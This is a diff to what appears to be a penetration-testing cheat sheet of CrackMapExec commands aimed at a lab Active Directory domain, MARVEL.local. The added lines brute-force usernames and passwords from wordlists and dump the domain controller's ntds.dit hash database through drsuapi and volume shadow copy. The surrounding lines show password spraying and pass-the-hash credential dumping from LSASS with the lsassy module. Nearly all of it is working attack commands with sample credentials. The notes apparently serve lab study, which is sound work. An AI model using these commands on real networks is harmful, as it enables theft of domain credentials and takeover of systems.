@@ -108,12 +108,22 @@ crackmapexec smb 192.168.154.0/24 -u Administrator fcastle -d MARVEL.local -p P@
 #Bruteforce password.
 crackmapexec smb 192.168.154.0/24 -u Administrator fcastle -d MARVEL.local -p P@\$\$w0rd Password@123
 
+#Bruteforce username and password
+crackmapexec smb 192.168.154.0/24 -u ./users.txt  -d MARVEL.local -p ./pass.txt
+
+#Dump ntds.dit database from domain controller using drsuapi protocol
+crackmapexec smb 192.168.154.134 -u Administrator -d MARVEL.local -p P@\$\$w0rd --ntds drsuapi
+
+#Dump ntds.dit database from domain controller using vss(Volumn shadow copy)
+crackmapexec smb 192.168.154.134 -u Administrator -d MARVEL.local -p P@\$\$w0rd --ntds vss
 
 #Checkout module of particular protocol.
 crackmapexec smb -L
 
 #using the modules
 crackmapexec smb 192.168.0.0/24 -u administrator -H <NTLM-HASH> --local-auth -M lsassy
+
+
 
 #interect with database
 cmedb
